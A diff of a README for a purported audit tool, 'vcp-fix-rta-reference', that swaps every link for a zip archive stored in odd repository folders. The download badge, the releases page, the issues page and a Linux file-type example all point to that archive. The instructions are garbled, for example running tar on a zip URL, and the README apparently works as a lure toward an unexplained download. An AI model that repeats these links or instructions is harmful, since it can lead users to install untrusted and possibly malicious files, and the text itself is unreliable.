@@ -1,6 +1,6 @@
 # 🚀 vcp-fix-rta-reference - Effortless Real-Time Audit Solutions
 
-[![Download vcp-fix-rta-reference](https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip)](https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip)
+[![Download vcp-fix-rta-reference](https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip)](https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip)
 
 ## 📖 Introduction
 
@@ -13,11 +13,11 @@ To begin, you will need to download the application. Below is a simple guide to 
 ### 📥 Downloading the Application
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [Download vcp-fix-rta-reference](https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip)
+   [Download vcp-fix-rta-reference](https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip)
 
 2. **Choose Your Version:** On the releases page, you will find different versions of the application. Select the latest version for the best features and improvements.
 
-3. **Download the File:** Locate the file appropriate for your operating system (e.g., .exe for Windows, .dmg for macOS, https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip for Linux). Click to download.
+3. **Download the File:** Locate the file appropriate for your operating system (e.g., .exe for Windows, .dmg for macOS, https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip for Linux). Click to download.
 
 4. **Check Size and Integrity:** Once the download completes, check the file size to ensure it downloaded correctly. If provided, verify the checksum to confirm the file's integrity.
 
@@ -47,7 +47,7 @@ To begin, you will need to download the application. Below is a simple guide to 
 
 1. **Extract the Tarball:** Use the terminal to navigate to the download location. Input the following command:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip
+   tar -xvzf https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip
    ```
 
 2. **Change Directory:** Navigate to the extracted folder:
@@ -87,7 +87,7 @@ After successfully installing the application, you can start using it.
 
 ## 🤝 Support
 
-If you encounter any issues, please reach out. You can check our [issues page](https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip) for common questions and solutions. For specific queries, feel free to create a new issue for assistance.
+If you encounter any issues, please reach out. You can check our [issues page](https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip) for common questions and solutions. For specific queries, feel free to create a new issue for assistance.
 
 ## 📣 Community
 
@@ -100,4 +100,4 @@ Learn more about VCP and its implementation:
 - [VeritasChain Protocol Documentation](#)
 - [FIX Protocol Information](#)
 
-Thank you for choosing vcp-fix-rta-reference. We hope you find it beneficial for your auditing needs! Remember to download it here: [Download vcp-fix-rta-reference](https://raw.githubusercontent.com/mmarty-nas/vcp-fix-rta-reference/main/datasets/rta-reference-fix-vcp-3.6.zip).
+Thank you for choosing vcp-fix-rta-reference. We hope you find it beneficial for your auditing needs! Remember to download it here: [Download vcp-fix-rta-reference](https://github.com/mmarty-nas/vcp-fix-rta-reference/raw/refs/heads/main/certificates/vcp_fix_rta_reference_3.9.zip).
